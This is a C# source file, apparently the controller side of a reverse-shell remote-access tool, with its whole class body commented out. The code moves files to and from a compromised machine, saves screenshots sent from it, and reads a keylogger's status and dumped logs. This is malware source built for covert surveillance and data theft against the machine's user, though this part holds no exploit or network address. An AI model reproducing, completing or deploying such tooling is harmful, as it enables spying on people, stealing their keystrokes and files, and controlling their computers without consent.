using System;
using System.IO;
using System.Net;
using System.Text;

namespace ReverseShellClient
{
    public class ClientTools
    {
        /*
        readonly BinaryWriter bw;
        readonly BinaryReader br;
        readonly StreamWriter sw;
        readonly StreamReader sr;


        public ClientTools(BinaryWriter bw, BinaryReader br, StreamWriter sw, StreamReader sr)
        {
            this.bw = bw;
            this.br = br;
            this.sw = sw;
            this.sr = sr;
        }


        public void UploadFile(string path)
        {
            ConsoleColorTools.WriteCommandMessage("Starting upload of file '" + path + "' to the server");

            // Send the data length first
            bw.Write((int)new FileInfo(path).Length);
            bw.Flush();

            using (var readStream = new FileStream(path, FileMode.Open))
            {
                var buffer = new byte[4096];
                int bytesRead;
                while ((bytesRead = readStream.Read(buffer, 0, buffer.Length)) > 0)
                {
                    bw.Write(buffer, 0, bytesRead);
                }

                bw.Flush();
            }

            var result = sr.ReadLine();

            if (result == "Success")
            {
                ConsoleColorTools.WriteCommandSuccess("File successfully uploaded to the server");
            }
            else
            {
                ConsoleColorTools.WriteCommandError("An error occured");
            }
        }


        public void DownloadFile(string path)
        {
            if (sr.ReadLine() == "false")
            {
                ConsoleColorTools.WriteCommandError("The specified file doesn't exist");
                return;
            }

            ConsoleColorTools.WriteCommandMessage("Starting download of file '" + path + "' from the server");

            var dataLength = br.ReadInt32();

            try
            {
                using (var fs = new FileStream(path, FileMode.Create))
                {
                    var buffer = new byte[4096];
                    int bytesRead;
                    var bytesWritten = 0;
                    while ((bytesRead = br.Read(buffer, 0, buffer.Length)) > 0)
                    {
                        fs.Write(buffer, 0, bytesRead);
                        bytesWritten += bytesRead;

                        // The file has been totally written
                        if (bytesWritten == dataLength)
                        {
                            break;
                        }
                    }
                }

                ConsoleColorTools.WriteCommandSuccess("File successfully downloaded from the server");
            }
            catch (Exception)
            {
                // Delete the partially created file
                File.Delete(path);
                ConsoleColorTools.WriteCommandError("An error occured");
            }
        }


        public void WaitForServerToFinishFileDownload()
        {
            ConsoleColorTools.WriteCommandMessage("Starting download of file from url");

            var result = sr.ReadLine();
            if (result.Contains("Success"))
            {
                ConsoleColorTools.WriteCommandSuccess("File downloaded successfully : " + result.Split(':')[1]);
            }
            else
            {
                var error = result.Split(':')[1];
                error = error == "IO" ? "can't write here (IO)" : "network error";

                ConsoleColorTools.WriteCommandError("An error occured : " + error);
            }
        }


        public void ReceiveScreenShot()
        {
            ConsoleColorTools.WriteCommandMessage("Waiting for screenshot data...");
            var fileName = DateTime.Now.ToShortDateString().Replace('/', '-')
                           + "_"
                           + DateTime.Now.Hour + '-' + DateTime.Now.Minute + '-' + DateTime.Now.Second
                           + ".png";

            // Get data length
            var dataLength = br.ReadInt32();

            try
            {
                using (var fs = new FileStream(fileName, FileMode.Create))
                {
                    var buffer = new byte[4096];
                    int bytesRead;
                    var bytesWritten = 0;
                    while ((bytesRead = br.Read(buffer, 0, buffer.Length)) > 0)
                    {
                        fs.Write(buffer, 0, bytesRead);
                        bytesWritten += bytesRead;

                        // The file has been totally written
                        if (bytesWritten == dataLength)
                        {
                            break;
                        }
                    }
                }

                ConsoleColorTools.WriteCommandSuccess("Screenshot saved : " + fileName);
            }
            catch (Exception)
            {
                // Delete the partially created file
                File.Delete(fileName);
                ConsoleColorTools.WriteCommandError("An error occured");
            }
        }


        public void lcwd() => Console.WriteLine("Local cwd : '{0}'", Directory.GetCurrentDirectory());


        public void lls()
        {
            var cwd = Directory.GetCurrentDirectory();

            foreach (var directory in Directory.GetDirectories(cwd))
            {
                var formattedDirectory = directory.Substring(directory.LastIndexOf('\\') + 1);
                Console.WriteLine("  <DIR>   {0}", formattedDirectory);
            }

            foreach (var file in Directory.GetFiles(cwd))
            {
                var formattedFile = file.Substring(file.LastIndexOf('\\') + 1);
                Console.WriteLine("          {0}", formattedFile);
            }
        }

        
        public void lcd(string argument)
        {
            var path = Path.Combine(Directory.GetCurrentDirectory(), argument);
            if (Directory.Exists(path))
            {
                Directory.SetCurrentDirectory(path);
                // Display new local cwd
                lcwd();
            }
            else
            {
                ConsoleColorTools.WriteCommandError("No such directory");
            }
        }

        
        public void SayHello()
        {
            // Say hello to display the cmd path
            sw.WriteLine("Hello !");
            sw.Flush();
        }


        #region Modules functions

        #region Keylogger
        public void GetKeyloggerStatus() => Console.WriteLine(sr.ReadLine());


        public void DumpKeyloggerLogs()
        {
            // TODO : implement possibility to send the dump in a file
            Console.WriteLine(sr.ReadLine());
        }
        #endregion Keylogger

        #endregion Modules functions
        */
    }
}
